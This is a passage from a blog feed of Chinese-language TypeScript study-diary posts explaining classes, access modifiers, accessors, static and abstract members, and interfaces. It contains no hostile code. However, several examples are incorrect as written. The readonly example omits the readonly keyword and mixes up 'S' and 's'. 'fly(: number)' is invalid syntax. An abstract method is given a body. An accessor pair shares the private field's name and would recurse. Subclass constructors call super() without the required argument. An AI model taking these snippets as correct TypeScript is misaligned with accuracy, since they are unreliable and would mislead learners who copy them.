    <content type="html"><![CDATA[<p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。<br><a id="more"></a></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。</p><h4 id="类的集成"><a href="#类的集成" class="headerlink" title="类的集成"></a>类的集成</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    name: string; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 ts 中，子类继承父类，如果之类中声明了 构造器(constructor) 则必须调用 super()</span></span><br><span class="line">    <span class="comment">// 否则 ts 会抛出错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="公共，私有与受保护的修饰符"><a href="#公共，私有与受保护的修饰符" class="headerlink" title="公共，私有与受保护的修饰符"></a>公共，私有与受保护的修饰符</h4><p><strong>默认值 public</strong></p><p>如果一个类中的成员没有显示的表明修饰符，那么默认他们都是 <code>public</code>。<br>上面的例子和下面的效果是一致的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    public name: string; </span><br><span class="line"></span><br><span class="line">    public <span class="keyword">constructor</span>(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>私有属性 private</strong></p><p>如果一个类中的成员被标记为 <code>private</code>，那么它就不能在该类的外部被访问，因为它是私有的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    private name: string; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Super(<span class="string">'Bird'</span>).name)</span><br></pre></td></tr></table></figure><p><strong>受保护属性 protected</strong></p><p><code>protected</code> 与 <code>private</code> 的行为相似，但是 <code>protected</code> 的属性在 <code>子类内部</code> 中仍然可以访问。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    protected name: string; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">super</span>(name)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handle() &#123;</span><br><span class="line">        <span class="comment">// success</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 能成功输出</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Son().handle)</span><br><span class="line"></span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> Son().name)</span><br></pre></td></tr></table></figure><p>构造函数被标记为 <code>protected</code> 时，该类不能被实例化，但可以被继承，继承它的之类可以被实例化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    protected name: string; </span><br><span class="line"></span><br><span class="line">    protected <span class="keyword">constructor</span>(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">super</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handle() &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> S = <span class="keyword">new</span> Super(); <span class="comment">// error, super是被保护的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Son(); <span class="comment">// success</span></span><br></pre></td></tr></table></figure><p><strong>只读属性 readonly</strong></p><p>只读属性不能被修改，必须在 <code>声明时或者构造函数</code> 里被初始化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let name: string;</span></span><br><span class="line">    name: string; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fly () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> can fly!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> S = <span class="keyword">new</span> Super(<span class="string">'Jhon'</span>);</span><br><span class="line">s.name = <span class="string">'Carl'</span>; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><p><strong>参数属性</strong></p><p>在上面的例子中，我们总会声明一个 <code>name</code> 之后再通过构造器赋值。这种做法未免有些麻烦，通过 <code>参数属性</code> 我们可以将声明和赋值结合。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(private name: string) &#123; &#125; <span class="comment">// 直接在构造函数的参数中进行 声明、赋值</span></span><br><span class="line">    fly(: number) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>储存器</strong></p><p>通过储存器，我们可以修改上文中提到的 <code>private</code> 属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    private name: string;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(n: string) &#123; <span class="keyword">this</span>.name = n &#125;</span><br><span class="line"></span><br><span class="line">    get name(): string &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set name(n: string) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Super(<span class="string">'Jhon'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(s.name); <span class="comment">// -&gt; 'Jhon'</span></span><br><span class="line"></span><br><span class="line">s.name = <span class="string">'Carl'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s.name); <span class="comment">// -&gt; 'Carl'</span></span><br></pre></td></tr></table></figure><p><strong>静态属性 static</strong></p><p>上面的例子中属性大多都是实例化之后才能访问到的属性，通过 <code>static</code> 我们可以给类设置静态属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> name = <span class="string">'Jhon'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Super.name); <span class="comment">// -&gt; 'Jhon'</span></span><br></pre></td></tr></table></figure><p><strong>抽象类 abstract</strong></p><p>抽象类作为其它子类的父类使用，不能被实例化；不同于接口，抽象类可以包含成员的实现细节。<br>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似，两者都是定义方法签名但不包含方法体。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    abstract name: string;</span><br><span class="line"></span><br><span class="line">    abstract fly(): <span class="keyword">void</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">super</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eat():<span class="keyword">void</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> S = <span class="keyword">new</span> Super(); <span class="comment">// -&gt; error，抽象类不能被实例化</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Son(); <span class="comment">// -&gt; success</span></span><br><span class="line"></span><br><span class="line">s.fly(); <span class="comment">// -&gt; success </span></span><br><span class="line">s.eat(); <span class="comment">// -&gt; error, 抽象类中没有 eat 方法</span></span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><code>typescript</code> 中的类其实就是 <code>javascript</code> 中的构造函数；他们的用法完全相似，只不过 <code>typescript</code> 给构造函数添加了一些后端语言才有的 <code>修饰符</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;typescript&lt;/code&gt; 中的类与 &lt;code&gt;ES6&lt;/code&gt; 中的 &lt;code&gt;class&lt;/code&gt; 功能及使用基本一致；不过 &lt;code&gt;typescript&lt;/code&gt; 对于属性的定义却是使用了一些后端语言的关键字。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(二)</title>
    <link href="https://github.com/TheNightElf/2018/01/18/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/18/Typescript学习日记（二）/</id>
    <published>2018-01-18T09:59:42.000Z</published>
    <updated>2018-01-20T07:56:10.974Z</updated>
    
    <content type="html"><![CDATA[<p>本篇介绍 <code>typescript</code> 中接口的使用方式。<br><a id="more"></a></p><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口(interface)"></a>接口(interface)</h3><p><code>TypeScript</code>的核心原则之一是对值所具有的结构进行类型检查。接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。<br>基础类型是为简单的变量定义类型，<strong>通常的，接口就是为你所定义的对象(参数、函数等)的添加类型的约束。</strong><br>按照 typescript 的默认约定，接口通常是以 <code>驼峰命名方式，大写字母开头</code> 的方式定义。</p><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个接口约束</span></span><br><span class="line">interface T &#123;</span><br><span class="line">    num: number;</span><br><span class="line">    str: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数的接受的参数中，num必须为number类型，str必须为string类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: T</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> arg.num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接把约束条件写在函数参数中，为了可读性，推荐在外面定义</span></span><br><span class="line"><span class="comment">// eg:</span></span><br><span class="line"><span class="comment">// function demo(arg: &#123; num: number; str: string &#125;) &#123;</span></span><br><span class="line"><span class="comment">//     console.log(typeof arg.num)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="attr">num</span>: <span class="number">100</span>, <span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj1) <span class="comment">// success -&gt; number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="attr">num</span>: <span class="string">'123'</span>, <span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj2) <span class="comment">// error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj3 = &#123;<span class="attr">num</span>: <span class="number">123</span>&#125;</span><br><span class="line">demo(obj3) <span class="comment">// error 缺少一个 str 参数</span></span><br></pre></td></tr></table></figure><p><strong>注意：定义接口的时候不需要使用 <code>=</code>，<code>{}</code> 内部必须使用 <code>分号(;)</code> 分隔。</strong></p><h4 id="接口的可选属性"><a href="#接口的可选属性" class="headerlink" title="接口的可选属性"></a>接口的可选属性</h4><p>接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">interface T &#123;</span><br><span class="line">    num: number;</span><br><span class="line">    str?: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: T</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> arg.num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj4 = &#123;<span class="attr">num</span>: <span class="number">100</span>, <span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj4) <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj5 = &#123;<span class="attr">num</span>: <span class="number">100</span>&#125;</span><br><span class="line">demo(obj5) <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj6 = &#123;<span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj6) <span class="comment">// error</span></span><br></pre></td></tr></table></figure><h4 id="接口的只读属性"><a href="#接口的只读属性" class="headerlink" title="接口的只读属性"></a>接口的只读属性</h4><p>这里的 <code>只读属性</code> 类似于原生javascript的 <code>const</code> 关键字，在赋值之后就不能更改了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface Rd &#123;</span><br><span class="line">    readonly x: number;</span><br><span class="line">    readonly y: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r: Rd = &#123; <span class="attr">x</span>: <span class="number">100</span>, <span class="attr">y</span>: <span class="string">'str'</span> &#125;</span><br><span class="line"></span><br><span class="line">r.x = <span class="number">123</span>; <span class="comment">// -&gt; error</span></span><br></pre></td></tr></table></figure><h4 id="只读的数组"><a href="#只读的数组" class="headerlink" title="只读的数组"></a>只读的数组</h4><p>TypeScript具有 <code>ReadonlyArray&lt;T&gt;</code> 类型，它与 <code>Array&lt;T&gt;</code> 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: ReadonlyArray&lt;number&gt; = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">2</span>; <span class="comment">// -&gt; error</span></span><br><span class="line">arr.push(<span class="number">5</span>); <span class="comment">// -&gt; error</span></span><br><span class="line">arr.length = <span class="number">10</span>; <span class="comment">// -&gt; error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1: <span class="built_in">Array</span>&lt;number&gt; = arr;</span><br><span class="line"><span class="comment">// error, arr 是ReadonlyArray，不能赋值给别的数组</span></span><br></pre></td></tr></table></figure><h4 id="readonly还是const"><a href="#readonly还是const" class="headerlink" title="readonly还是const"></a>readonly还是const</h4><p>最简单判断该用readonly还是const的方法是看要把它做为变量使用还是做为一个属性。<br>做为变量使用的话用 const，若做为属性则使用readonly。</p><h4 id="额外的属性检查"><a href="#额外的属性检查" class="headerlink" title="额外的属性检查"></a>额外的属性检查</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Pc &#123;</span><br><span class="line">    x?: number;</span><br><span class="line">    y?: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: Pc</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo(&#123;<span class="attr">x</span>: <span class="number">100</span>, <span class="attr">z</span>: <span class="number">110</span>&#125;)</span><br><span class="line"><span class="comment">// error，因为 z 并没有在接口 Pc 中定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用类型断言改写</span></span><br><span class="line">demo(&#123;<span class="attr">x</span>: <span class="number">100</span>, <span class="attr">z</span>: <span class="number">110</span>&#125; <span class="keyword">as</span> Pc)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 告诉 ts 入参 '&#123;x: 100, z: 110&#125;' 都是来自于 Pc 接口的，你别 tmd 再帮我检查了</span></span><br><span class="line"><span class="comment">// ts： 好吧，既然你这么确定，我就听你的。</span></span><br></pre></td></tr></table></figure><p>然后上面的这种做法并不是最佳的做法，最佳的做法是添加一个 <code>占位用的签名</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 我不知道我后面还会传什么属性进来，所以我先用个 propsName 占个位置</span></span><br><span class="line">interface Pc &#123;</span><br><span class="line">    x?: number;</span><br><span class="line">    y?: string;</span><br><span class="line">    [propName: string]: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">demo(&#123;<span class="attr">x</span>: <span class="number">100</span>, <span class="attr">z</span>: <span class="number">110</span>&#125;)</span><br><span class="line"><span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h4><p>为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个 <code>只有参数列表和返回值类型</code> 的函数定义。<br><strong>参数列表里的每个参数都需要名字和类型。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Fn &#123;</span><br><span class="line">    (a: number, <span class="attr">b</span>: string): boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 Fn 函数接口，该函数接受 a: number，b: string 作为参数，返回一个 boolean 值</span></span><br></pre></td></tr></table></figure><h4 id="可索引的类型"><a href="#可索引的类型" class="headerlink" title="可索引的类型"></a>可索引的类型</h4><p>可索引类型具有一个 <code>索引签名</code>，它描述了对象 <code>索引的类型</code>，还有相应的索引 <code>返回值类型</code>。<br>共有两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 指定 索引类型 为 number</span></span><br><span class="line">interface IndexNum &#123;</span><br><span class="line">    [index: number]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr: IndexNum = [<span class="string">'hello'</span>, <span class="string">'world'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 指定 索引类型 为 string</span></span><br><span class="line">interface IndexStr 